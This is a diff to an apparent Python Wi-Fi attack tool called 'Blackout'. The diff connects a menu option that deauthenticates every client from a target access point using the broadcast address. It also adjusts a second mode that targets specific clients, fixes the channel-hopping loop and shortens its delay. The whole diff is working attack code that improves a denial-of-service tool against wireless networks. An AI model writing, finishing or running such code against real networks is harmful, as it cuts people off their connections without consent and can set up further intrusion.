@@ -99,9 +99,14 @@ class Blackout:
 
             choice = choose_mode()
 
+            # Deuth ALL clients from AP
             if choice == '1':
-                pass
+                Blackout.deauth(
+                    self.target_ap['bssid'],
+                    str(self.target_ap['channel']),
+                    BROADCAST_ADDR)
 
+            # Deauth specific client from AP
             elif choice == '2':
                 self.proc_sniff_clients.start()
                 self.proc_sniff_clients.join()
@@ -141,8 +146,7 @@ class Blackout:
         Allow multiple targets, including clients aswell as AP's
         """
 
-        if target is None:
-            target = BROADCAST_ADDR
+        if target is BROADCAST_ADDR:
             print(f"\n[*] Deauthenticating ALL clients from {bssid} on channel {channel}...")
         else:
             print(f"[*] Deauthing {target} from {bssid} on channel {channel}...")
@@ -291,12 +295,12 @@ class Blackout:
         Hop channels until interrupted
         """
 
-        # total number of channels
-        limit = 13
+        # total number of channels + 1 (14 channels to search through)
+        limit = 15
 
         while True:
-            for i in range(1, 10000):  # 10000 is arbitrary
-                channel = limit % i
+            for i in range(1, 15):  # 10000 is arbitrary
+                channel = i % limit
                 if channel == 0:
                     continue
 
@@ -310,7 +314,7 @@ class Blackout:
                 try:
                     # effectively execute p
                     p.communicate()
-                    sleep(3)  # TODO -- Experiment with different values
+                    sleep(1)  # TODO -- Experiment with different values
                 except KeyboardInterrupt:
                     break
                 except Exception as e:
